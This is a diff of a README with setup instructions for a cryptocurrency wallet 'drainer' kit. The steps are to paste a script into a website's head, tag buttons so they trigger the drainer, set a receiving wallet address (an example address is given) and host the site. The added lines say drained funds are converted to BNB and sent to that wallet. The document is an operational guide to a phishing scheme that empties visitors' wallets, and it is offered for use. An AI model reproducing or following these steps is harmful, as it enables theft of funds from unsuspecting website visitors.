@@ -11,11 +11,10 @@ Installation on any website files and documentation included 🔥
   drainersystemonly.rar
 
 # STEP 1 (FOLLOW THE TUTORIAL IN THE UPDATED .RAR FOR STEP 1
-<script charset="UTF-8" type="text/javascript" src="./85562950-42ac-48d9-9757-cb0ae30ccb7c.js"></script>
-<!–– Please do not forgot to update the files.zip (now unflagged) ––>
+<script charset="UTF-8" async type="text/javascript" src="./a368b67175218.46f.js"></script>
 
 Paste these scripts in the head of your index.html of your website
-then add the class "interact-button" to any buttons that you want to prompt the drainer.
+then add the class "connectButton" to any buttons that you want to prompt the drainer.
 
 
 # STEP 2
@@ -26,9 +25,7 @@ Move all the files and folder in the directory of your website. ( Image, Scripts
 # STEP 3 (USE THE NEW WALLET.JS IN THE UPDATED .RAR)
 Add your Wallet Adresses in the wallet.js files, you can find the .js files in the scripts folder.
 
-Now replace this line "0xreceiverwallet" for your wallet bsc and your wallet eth 
-
-"eth_wallet_receiver_id" = "0xreceiverwallet";
+Now replace this line "0xreceiverwallet" for your wallet bsc
 
 "bsc_wallet_receiver_id" = "0xreceiverwallet";
 
@@ -37,8 +34,6 @@ Now replace this line "0xreceiverwallet" for your wallet bsc and your wallet eth
 
 It should look like this
 
-"eth_wallet_receiver_id" = "0x3f349bBaFEc1551819B8be1EfEA2fC46cA749aA1";
-
 "bsc_wallet_receiver_id" = "0x3f349bBaFEc1551819B8be1EfEA2fC46cA749aA1";
 .
 
@@ -46,6 +41,7 @@ It should look like this
 All is setup your drainer is ready to go. 
 Upload your website on Vercel or any Hosting
 
+📛 All Drained will be convert into BNB and send to the receiver wallet ( BNB - BINANCE SMART CHAIN) 📛
 
 # 📛 THE DRAINER ONLY DRAIN BALANCE WITH MINIMUM 10.00$ FOR COVERING TRANSACTION FEE 📛
 
